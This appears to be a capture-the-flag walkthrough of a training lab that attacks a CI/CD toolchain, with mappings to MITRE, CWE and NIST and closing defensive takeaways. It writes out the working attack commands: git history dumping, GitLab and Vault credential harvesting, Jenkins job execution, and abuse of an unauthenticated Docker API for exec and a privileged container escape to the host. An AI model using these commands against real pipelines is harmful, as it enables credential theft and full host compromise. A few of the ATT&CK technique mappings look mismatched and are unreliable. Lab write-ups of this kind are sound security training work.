# Sec4US CTF: DevSecOps Ecosystem Lab

Full walkthrough of the **DevOps Ecosystem Exploits** lab from [Sec4US](https://sec4us.com.br/treinamentos/devops-ecosystem-exploits/). This lab simulates a real-world CI/CD pipeline with seven interconnected services running behind an Nginx TLS reverse proxy. The goal is to compromise the entire DevOps toolchain, moving from exposed git history all the way to container escape on the host.

> **Disclaimer:** This lab was solved on the official Sec4US training platform under authorized scope. No real production systems were targeted.

---

## Lab Overview

| Detail | Value |
|--------|-------|
| **Category** | DevOps / CI-CD Offensive Security |
| **Difficulty** | Hard |
| **Flags** | 10 (1833 pts total) |
| **Result** | 10/10 flags, Rank #3 |
| **Training** | DevOps Ecosystem Exploits (M4v3r1ck / Helvio Junior) |

### Services

| Service | Hostname | Role |
|---------|----------|------|
| GitLab | `gitlab.labs.sec4us.com.br` | Source code management |
| Jenkins | `jenkins.labs.sec4us.com.br` | Build automation |
| Artifactory | `artifactory.labs.sec4us.com.br` | Artifact repository |
| SonarQube | `sonar.labs.sec4us.com.br` | Static analysis |
| Vault | `vault.labs.sec4us.com.br` | Secrets management |
| Web Server | `www.labs.sec4us.com.br` | Production site |
| Docker Registry | `registry.labs.sec4us.com.br` | Container images |

All services share a self-signed TLS certificate (Sec4US Root CA) and are routed by Host header through Nginx on port 443. Accessing by IP alone returns nothing; always use the hostname.

---

## Kill Chain Summary

The ten flags form a single exploitation chain where each compromised service unlocks access to the next:

```
www .git exposed
    |
    v
[F1] Token in git history --> GitLab API
    |                             |
    |                     +-------+-------+
    |                     |               |
    v                     v               v
[F3] CI variable    [F4] Vault token    [F2] JAR bytecode
    (FLAG{})           (limited)          in Artifactory
                          |               (SonarQube pwd)
                          |
              +-----------+-----------+
              |           |           |
              v           v           v
        [F5] Jenkins  [F6] Artif.  [F8] GitLab
         admin pwd     admin pwd    root pwd
              |
              v
        [F7] Jenkins job on
         Windows runner
              |
              v
     Docker TCP API (no auth)
              |
        +-----+-----+
        |           |
        v           v
  [F9] Vault    [F10] Container
   root token    escape to host
```

---

## Flag 1: Rastro no Historico (50 pts)

**Objective:** Recover a credential hidden in the web server's git history.

### Reconnaissance

The web server at `www.labs.sec4us.com.br` returns a directory listing. More interestingly, the `.git` directory is publicly accessible, meaning the entire repository can be reconstructed.

### Exploitation

```bash
# Dump the exposed .git directory
pip3 install git-dumper
git-dumper https://www.labs.sec4us.com.br/.git ./www-repo

cd www-repo
git log --all --oneline
```

Browsing the commit history reveals Ansible playbooks. One file, `gitlab_helvio.yml`, contains a GitLab personal access token that was later obfuscated with base64+XOR encoding, but the original plaintext version remains in an older commit.

```bash
git log -p --all -- "*.yml" | grep -i "token\|password\|secret"
```

The token found in the history is the flag value: a `glpat-*` personal access token.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Credentials in Files | T1552.001 | Token stored in git-tracked playbook |
| Valid Accounts: Cloud Accounts | T1078.004 | GitLab PAT reuse |

### CWE

- **CWE-540:** Inclusion of Sensitive Information in Source Code
- **CWE-312:** Cleartext Storage of Sensitive Information

---

## Flag 2: Olho do Inspetor (125 pts)

**Objective:** Extract the SonarQube admin password from a build artifact.

### Exploitation

The Artifactory repository allows anonymous browsing. Among the published artifacts is a Java helper library (`sonar-helper-*.jar`) that interacts with SonarQube.

```bash
# Download the JAR from Artifactory
curl -k -O "https://artifactory.labs.sec4us.com.br/libs-release/com/sec4us/sonar-helper/1.0.0/sonar-helper-1.0.0-all.jar"

# Decompile and search for hardcoded credentials
jar xf sonar-helper-1.0.0-all.jar
# Use cfr, procyon, or jadx to decompile .class files
find . -name "*.class" -exec javap -c {} \; | grep -i "password\|admin\|sonar"
```

The decompiled bytecode reveals the SonarQube admin password hardcoded as a string constant.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Credentials in Files | T1552.001 | Password embedded in compiled bytecode |
| Software Discovery | T1518 | Artifact enumeration on Artifactory |

### CWE

- **CWE-798:** Use of Hard-coded Credentials
- **CWE-311:** Missing Encryption of Sensitive Data

---

## Flag 3: Variavel Indiscreta (75 pts)

**Objective:** Retrieve a masked CI/CD variable through the GitLab API.

### Exploitation

Using the personal access token recovered from Flag 1, enumerate projects and their CI/CD variables via the GitLab API:

```bash
# List accessible projects
curl -k -H "PRIVATE-TOKEN: [RECOVERED_TOKEN]" \
  "https://gitlab.labs.sec4us.com.br/api/v4/projects"

# Enumerate CI/CD variables for each project
curl -k -H "PRIVATE-TOKEN: [RECOVERED_TOKEN]" \
  "https://gitlab.labs.sec4us.com.br/api/v4/projects/<ID>/variables"
```

One of the projects (`sec4us/bank`) stores a CI variable with a `FLAG{...}` value. Although the variable is marked as "masked" in the GitLab UI, the API returns the raw value when queried with sufficient permissions.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | CI var enumeration |
| Forge Web Credentials: Web Session Cookie | T1606.001 | API token reuse across projects |

### CWE

- **CWE-922:** Insecure Storage of Sensitive Information
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor

---

## Flag 4: Passe Emprestado (91 pts)

**Objective:** Obtain a Vault token stored as a CI/CD variable.

### Exploitation

Continuing the API enumeration from Flag 3, another project (`sec4us/devsecops`) has a masked CI variable named `VAULT_TOKEN`. This is a HashiCorp Vault token with limited scope, intended for CI pipeline use.

```bash
curl -k -H "PRIVATE-TOKEN: [RECOVERED_TOKEN]" \
  "https://gitlab.labs.sec4us.com.br/api/v4/projects/<ID>/variables" \
  | jq '.[] | select(.key == "VAULT_TOKEN")'
```

The Vault token returned (`hvs.*`) has limited permissions but is enough to read specific secret paths.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | CI variable leak |
| Valid Accounts: Cloud Accounts | T1078.004 | Vault token hijacking |

### CWE

- **CWE-522:** Insufficiently Protected Credentials

---

## Flag 5: Maestro da Esteira (148 pts)

**Objective:** Obtain the Jenkins admin password from the Vault secrets engine.

### Exploitation

With the Vault root token obtained later in the chain (Flag 9), read the Jenkins admin credentials stored as a Vault secret:

```bash
curl -k -H "X-Vault-Token: [ROOT_TOKEN]" \
  "https://vault.labs.sec4us.com.br/v1/secret/jenkins/admin" | jq
```

The response contains the Jenkins admin password in plaintext.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Credentials from Password Stores | T1555 | Vault KV store read |
| Account Manipulation | T1098 | Admin account compromise |

---

## Flag 6: Dono da Prateleira (98 pts)

**Objective:** Obtain the Artifactory admin password from the Vault.

### Exploitation

Similar to Flag 5, the Artifactory admin credentials are stored in Vault at `secret/artifactory/admin`:

```bash
curl -k -H "X-Vault-Token: [ROOT_TOKEN]" \
  "https://vault.labs.sec4us.com.br/v1/secret/artifactory/admin" | jq
```

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Credentials from Password Stores | T1555 | Vault secrets enumeration |

---

## Flag 7: Ponta da Esteira (295 pts)

**Objective:** Read a file on the Jenkins Windows build agent.

### Exploitation

With the Jenkins admin password (Flag 5), authenticate to the Jenkins API and create a Freestyle job targeting the Windows runner (`JenkinsRunnerWin`):

```bash
# Obtain a CSRF crumb token
CRUMB=$(curl -k -s -u "admin:[JENKINS_PWD]" \
  "https://jenkins.labs.sec4us.com.br/crumbIssuer/api/json" | jq -r '.crumb')

# Create a job that reads C:\secrets\flag.txt on the Windows agent
# The job XML specifies the label "JenkinsRunnerWin" as the node restriction
curl -k -X POST -u "admin:[JENKINS_PWD]" \
  -H "Jenkins-Crumb: $CRUMB" \
  -H "Content-Type: application/xml" \
  -d @job.xml \
  "https://jenkins.labs.sec4us.com.br/createItem?name=readflag"

# Trigger the build and read the console output
curl -k -X POST -u "admin:[JENKINS_PWD]" \
  -H "Jenkins-Crumb: $CRUMB" \
  "https://jenkins.labs.sec4us.com.br/job/readflag/build"

# Wait a moment, then read the output
curl -k -u "admin:[JENKINS_PWD]" \
  "https://jenkins.labs.sec4us.com.br/job/readflag/lastBuild/consoleText"
```

The build shell step executes `type C:\secrets\flag.txt` on the Windows agent, revealing the flag in the console output.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Execution: Software Deployment Tools | T1072 | Jenkins as execution platform |
| Remote Services: Software Deployment Tools | T1021.010 | Job creation on remote agent |

### CWE

- **CWE-250:** Execution with Unnecessary Privileges

---

## Flag 8: Dono da Forja (70 pts)

**Objective:** Obtain the GitLab root password from the Vault.

### Exploitation

The Vault root token (Flag 9) also grants access to `secret/gitlab/admin`:

```bash
curl -k -H "X-Vault-Token: [ROOT_TOKEN]" \
  "https://vault.labs.sec4us.com.br/v1/secret/gitlab/admin" | jq
```

The response contains the GitLab root password.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Unsecured Credentials: Credentials from Password Stores | T1555 | Vault centralized secrets |
| Valid Accounts: Cloud Accounts | T1078.004 | GitLab root compromise |

---

## Flag 9: Chave Mestra (398 pts)

**Objective:** Obtain the Vault root token via Docker API abuse.

### Exploitation

This is the pivotal flag in the chain. From within the GitLab runner environment (accessed via a CI pipeline or build directory inspection), network enumeration reveals an exposed Docker TCP API on `172.17.0.1:2375` with no authentication:

```bash
# Verify Docker API is accessible
curl http://172.17.0.1:2375/version

# List running containers
curl http://172.17.0.1:2375/containers/json | jq '.[].Names'
```

The Vault container is running. Execute a command inside it to read the Vault unseal/root key stored on disk:

```bash
# Create an exec instance in the Vault container
curl -X POST http://172.17.0.1:2375/containers/<vault_id>/exec \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/vault/ansible_vault.key"],"AttachStdout":true}'

# Start the exec and read the output
curl -X POST "http://172.17.0.1:2375/exec/<exec_id>/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'
```

The file `/vault/ansible_vault.key` contains the Vault root token (`hvs.*`).

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Exploitation of Remote Services | T1210 | Docker TCP API without authentication |
| Container Administration Command | T1609 | Exec into running container |
| Unsecured Credentials: Credentials in Files | T1552.001 | Root token stored on disk |

### CWE

- **CWE-306:** Missing Authentication for Critical Function
- **CWE-250:** Execution with Unnecessary Privileges

### NIST SP 800-53 Rev. 5

- **AC-3:** Access Enforcement (Docker API lacks access control)
- **CM-7:** Least Functionality (unnecessary TCP socket exposed)
- **IA-2:** Identification and Authentication (no auth required)

---

## Flag 10: Fim da Linha (499 pts)

**Objective:** Escape the container and read a file on the host filesystem.

### Exploitation

With access to the unauthenticated Docker API, create a new privileged container that bind-mounts the host root filesystem:

```bash
# Create a privileged container with host root mounted
curl -X POST http://172.17.0.1:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/hostroot/root/flag.txt"],
    "HostConfig": {
      "Binds": ["/:/hostroot"],
      "Privileged": true
    }
  }'

# Start the container
curl -X POST "http://172.17.0.1:2375/containers/<container_id>/start"

# Read the logs (output of the command)
curl "http://172.17.0.1:2375/containers/<container_id>/logs?stdout=true"
```

By mounting the host root at `/hostroot` inside a privileged container, the file `/root/flag.txt` on the underlying host becomes directly readable.

### MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Escape to Host | T1611 | Privileged container with host filesystem mount |
| Container Administration Command | T1609 | Docker API container creation |
| Data from Local System | T1005 | Reading flag from host root |

### CWE

- **CWE-250:** Execution with Unnecessary Privileges
- **CWE-306:** Missing Authentication for Critical Function
- **CWE-269:** Improper Privilege Management

### NIST SP 800-53 Rev. 5

- **AC-6:** Least Privilege (privileged flag should not be available)
- **SC-7:** Boundary Protection (container-host boundary violated)
- **CM-7:** Least Functionality (Docker TCP API exposed without auth)

---

## Security Framework Alignment

### MITRE ATT&CK Matrix Coverage

| Tactic | Techniques Used |
|--------|----------------|
| Reconnaissance | T1592 (infrastructure fingerprinting), T1595 (active scanning) |
| Resource Development | T1588.002 (tool acquisition: git-dumper, javap, curl) |
| Initial Access | T1190 (exploit public-facing application: .git exposure) |
| Credential Access | T1552.001 (credentials in files), T1555 (password stores), T1078.004 (cloud accounts) |
| Execution | T1072 (software deployment tools: Jenkins), T1609 (container admin command) |
| Lateral Movement | T1021.010 (remote services: Jenkins agent), T1210 (exploitation of remote services: Docker API) |
| Privilege Escalation | T1611 (escape to host via container) |
| Collection | T1005 (data from local system) |

### MITRE D3FEND Countermeasures

| Technique | D3FEND ID | Recommendation |
|-----------|-----------|----------------|
| Credential Hardening | D3-CH | Rotate tokens; use short-lived credentials |
| Network Isolation | D3-NI | Restrict Docker TCP API to localhost or disable |
| File Access Monitoring | D3-FAM | Alert on .git directory access from external IPs |
| Service Hardening | D3-SH | Remove anonymous access from Artifactory |

### NIST CSF 2.0

| Function | Category | Finding |
|----------|----------|---------|
| Identify | ID.AM | Incomplete asset inventory (Docker API exposure unknown) |
| Protect | PR.AC | Missing authentication on Docker TCP API |
| Protect | PR.DS | Secrets stored in plaintext (git history, bytecode, filesystem) |
| Detect | DE.CM | No monitoring of Docker API calls or git history access |
| Respond | RS.MI | No automated secret rotation after exposure |

### CIS Controls v8

| Control | Finding |
|---------|---------|
| 3.11 | Encrypt Sensitive Data at Rest: Vault root token stored in cleartext file |
| 4.7 | Manage Default Accounts: SonarQube admin password never rotated |
| 6.3 | Require MFA for Externally-Exposed Applications: no MFA on any service |
| 16.1 | Establish and Maintain a Secure Application Development Process: credentials in code |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `git-dumper` | Reconstruct .git repositories from exposed directories |
| `curl` / `jq` | API interaction (GitLab, Vault, Jenkins, Docker) |
| `javap` / CFR / jadx | Java bytecode decompilation |
| `nmap` | Service fingerprinting |
| `python3` | Custom scripting for flag collection |

---

## Key Takeaways

1. **Git history is forever:** deleting a secret from the current branch does not remove it from the history. Use tools like `git-filter-repo` or BFG Repo Cleaner, and rotate every exposed credential immediately.

2. **Artifact repositories leak secrets:** JAR, WAR, and Docker images can contain hardcoded credentials. Scan artifacts before publishing with tools like truffleHog or Gitleaks.

3. **CI/CD variables are not vault-grade:** "masked" variables in GitLab CI are not encrypted at rest and are readable via API with the right token scope. Use external secret managers with dynamic, short-lived credentials.

4. **Docker TCP API without auth is game over:** exposing the Docker socket or TCP API without TLS + client certificate authentication allows full container escape to the host. Restrict to Unix socket with proper group permissions.

5. **Vault root tokens must not persist on disk:** the Ansible provisioning left the root token in a file inside the container. Use `vault operator init` with PGP keys and immediately revoke the root token after initial setup.

---

## License

These writeups are released for educational purposes. Do not use any technique shown here against systems you do not own or have explicit permission to test.

---

From the web server's exposed .git to a full container escape on the underlying host: ten flags, one unbroken chain. Every link existed because someone assumed "internal means safe." The pipeline was the perimeter, and nobody was watching.

Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
